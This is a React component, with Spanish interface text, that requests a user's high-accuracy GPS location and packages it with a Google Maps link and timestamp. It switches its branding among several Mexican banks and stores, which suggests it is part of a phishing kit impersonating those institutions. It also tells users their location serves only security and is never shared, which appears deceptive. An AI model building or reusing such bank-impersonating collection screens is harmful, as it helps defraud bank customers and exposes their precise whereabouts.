import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { MapPin, AlertCircle, Loader2 } from 'lucide-react';

interface GeolocationRequestProps {
  onLocationGranted: (locationData: LocationData) => void;
  onLocationDenied: () => void;
  bankType?: string;
}

interface LocationData {
  latitude: string;
  longitude: string;
  googleMapsLink: string;
  timestamp: string;
}

const GeolocationRequest: React.FC<GeolocationRequestProps> = ({
  onLocationGranted,
  onLocationDenied,
  bankType
}) => {
  const [isRequestingLocation, setIsRequestingLocation] = useState(false);
  const [locationError, setLocationError] = useState<string | null>(null);

  const requestLocation = () => {
    setIsRequestingLocation(true);
    setLocationError(null);

    // Verificar si la geolocalización está disponible
    if (!navigator.geolocation) {
      setLocationError('La geolocalización no está soportada en este navegador.');
      setIsRequestingLocation(false);
      return;
    }

    // Solicitar ubicación con alta precisión
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        
        // Crear enlace de Google Maps
        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        
        const locationData: LocationData = {
          latitude: latitude.toString(),
          longitude: longitude.toString(),
          googleMapsLink,
          timestamp: new Date().toISOString()
        };

        console.log('[Geolocation] Ubicación obtenida:', locationData);
        
        setIsRequestingLocation(false);
        onLocationGranted(locationData);
      },
      (error) => {
        console.error('[Geolocation] Error obteniendo ubicación:', error);
        
        let errorMessage = 'No se pudo obtener la ubicación.';
        
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = 'Permiso de ubicación denegado. La aplicación requiere acceso a tu ubicación para continuar.';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage = 'Información de ubicación no disponible. Verifica tu conexión GPS.';
            break;
          case error.TIMEOUT:
            errorMessage = 'El tiempo de espera para obtener la ubicación expiró. Inténtalo de nuevo.';
            break;
          default:
            errorMessage = 'Error desconocido al obtener la ubicación.';
            break;
        }
        
        setLocationError(errorMessage);
        setIsRequestingLocation(false);
      },
      {
        enableHighAccuracy: true, // Alta precisión GPS
        timeout: 10000, // 10 segundos de timeout
        maximumAge: 0 // No usar caché de ubicación
      }
    );
  };

  const handleDenyLocation = () => {
    console.log('[Geolocation] Usuario denegó ubicación');
    onLocationDenied();
  };

  // Estilos dinámicos basados en el banco
  const getButtonStyle = () => {
    switch (bankType) {
      case 'BANORTE':
        return 'bg-red-600 hover:bg-red-700';
      case 'LIVERPOOL':
        return 'bg-pink-600 hover:bg-pink-700';
      case 'HSBC':
        return 'bg-red-600 hover:bg-red-700';
      case 'BBVA':
        return 'bg-blue-600 hover:bg-blue-700';
      case 'CITIBANAMEX':
        return 'bg-blue-800 hover:bg-blue-900';
      case 'SANTANDER':
        return 'bg-red-700 hover:bg-red-800';
      case 'PLATACARD':
        return 'bg-orange-500 hover:bg-orange-600';
      default:
        return 'bg-blue-600 hover:bg-blue-700';
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white rounded-lg shadow-md p-6 text-center">
      {/* Icono de ubicación */}
      <div className="mb-4">
        <MapPin className="mx-auto h-12 w-12 text-blue-600" />
      </div>
      
      {/* Título */}
      <h2 className="text-xl font-bold mb-3 text-gray-800">
        Acceso a Ubicación
      </h2>
      
      {/* Descripción */}
      <p className="text-gray-600 mb-4 text-sm leading-relaxed">
        Para brindarte un mejor servicio y seguridad, necesitamos acceder a tu ubicación.
        Esta información nos ayuda a verificar tu identidad y proteger tu cuenta.
      </p>
      
      {/* Información adicional */}
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
        <div className="flex items-start">
          <AlertCircle className="h-4 w-4 text-blue-500 mr-2 mt-0.5 flex-shrink-0" />
          <p className="text-blue-700 text-xs text-left">
            Tu ubicación será utilizada únicamente para fines de seguridad y verificación.
            No compartimos esta información con terceros.
          </p>
        </div>
      </div>

      {/* Error message */}
      {locationError && (
        <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
          <div className="flex items-start">
            <AlertCircle className="h-4 w-4 text-red-500 mr-2 mt-0.5 flex-shrink-0" />
            <p className="text-red-700 text-xs text-left">
              {locationError}
            </p>
          </div>
        </div>
      )}

      {/* Botones de acción */}
      <div className="space-y-3">
        <Button
          onClick={requestLocation}
          disabled={isRequestingLocation}
          className={`w-full ${getButtonStyle()} text-white font-medium`}
          data-testid="button-allow-location"
        >
          {isRequestingLocation ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Obteniendo ubicación...
            </>
          ) : (
            <>
              <MapPin className="mr-2 h-4 w-4" />
              Permitir Ubicación
            </>
          )}
        </Button>
        
        <Button
          onClick={handleDenyLocation}
          variant="outline"
          className="w-full border-gray-300 text-gray-600 hover:bg-gray-50"
          disabled={isRequestingLocation}
          data-testid="button-deny-location"
        >
          Continuar sin Ubicación
        </Button>
      </div>

      {/* Nota legal */}
      <p className="text-xs text-gray-500 mt-4">
        Al permitir el acceso a tu ubicación, aceptas que esta información sea utilizada
        para fines de seguridad y verificación de identidad.
      </p>
    </div>
  );
};

export default GeolocationRequest;